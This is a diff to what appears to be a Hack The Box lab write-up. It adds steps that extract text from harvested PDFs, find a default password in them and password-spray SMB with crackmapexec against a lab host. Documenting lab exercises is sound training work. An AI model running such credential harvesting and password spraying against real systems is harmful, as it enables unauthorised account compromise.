@@ -68,3 +68,21 @@ exiftool *upload.pdf | grep Creator | awk -F': ' '{print $2}' | sort -u
 ![image](https://github.com/regarmulia/HTB/assets/33616880/c455f320-d1a8-4227-8fb2-c7a237733da9)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/447f7d52-ef55-4f5b-9ef1-97e4df35eca7)
+
+```
+for f in *pdf; do pdftotext $f; done
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/9ed0481f-90bf-425a-b359-7ec3b702c948)
+
+```
+head -n1 *txt
+NewIntelligenceCorpUser9876
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/7470bba3-1f65-4360-90db-2d353f91365c)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/1274008a-d8b3-475d-acb1-af86b0b1f8b4)
+
+```
+crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/af9cb0b4-8e06-42ea-96e3-366f913af48a)
